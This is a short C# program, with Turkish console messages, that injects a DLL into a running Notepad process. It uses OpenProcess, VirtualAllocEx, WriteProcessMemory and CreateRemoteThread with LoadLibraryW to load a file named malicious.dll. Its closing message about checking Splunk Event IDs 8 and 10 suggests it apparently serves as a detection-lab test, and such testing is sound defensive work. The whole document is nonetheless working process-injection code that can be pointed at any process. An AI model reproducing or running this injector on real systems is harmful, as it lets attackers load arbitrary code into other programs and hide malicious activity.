using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

class SimpleInjector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    static void Main() {
        string dllPath = @"C:\temp_test\malicious.dll"; 
        
        Process[] targets = Process.GetProcessesByName("notepad");
        if (targets.Length == 0) {
            Console.WriteLine("Hata: notepad.exe çalışmıyor! Önce bir Not Defteri aç.");
            return;
        }

        Process target = targets[0];
        Console.WriteLine("Hedef Bulundu: " + target.ProcessName + " (PID: " + target.Id + ")");

        IntPtr hProc = OpenProcess(0x1F1FFF, false, target.Id);
        if (hProc == IntPtr.Zero) {
            Console.WriteLine("Hata: Handle alınamadı! (Hata Kodu: " + Marshal.GetLastWin32Error() + ")");
            Console.WriteLine("İpucu: Terminali 'Yönetici Olarak' çalıştırdığından emin ol.");
            return;
        }
        Console.WriteLine("Handle Alındı: 0x" + hProc.ToString("X"));

        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2), 0x3000, 0x40);
        if (addr == IntPtr.Zero) {
            Console.WriteLine("Hata: Bellek ayrılamadı! (Hata Kodu: " + Marshal.GetLastWin32Error() + ")");
            return;
        }

        IntPtr bytesWritten;
        byte[] buffer = Encoding.Unicode.GetBytes(dllPath);
        bool writeSuccess = WriteProcessMemory(hProc, addr, buffer, (uint)buffer.Length, out bytesWritten);
        if (!writeSuccess) {
            Console.WriteLine("Hata: Belleğe yazılamadı! (Hata Kodu: " + Marshal.GetLastWin32Error() + ")");
            return;
        }

        IntPtr loadLibAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");
        IntPtr threadId;
        IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLibAddr, addr, 0, out threadId);

        if (hThread == IntPtr.Zero) {
            Console.WriteLine("Hata: Uzak thread başlatılamadı! (Hata Kodu: " + Marshal.GetLastWin32Error() + ")");
            Console.WriteLine("VBS veya HVCI bu işlemi donanım seviyesinde blokluyor olabilir.");
        } else {
            Console.WriteLine("Başarılı! Thread ID: " + threadId);
            Console.WriteLine("Şimdi Splunk'ta Event ID 8 ve 10'u kontrol et.");
        }

        Console.ReadLine();
    }
}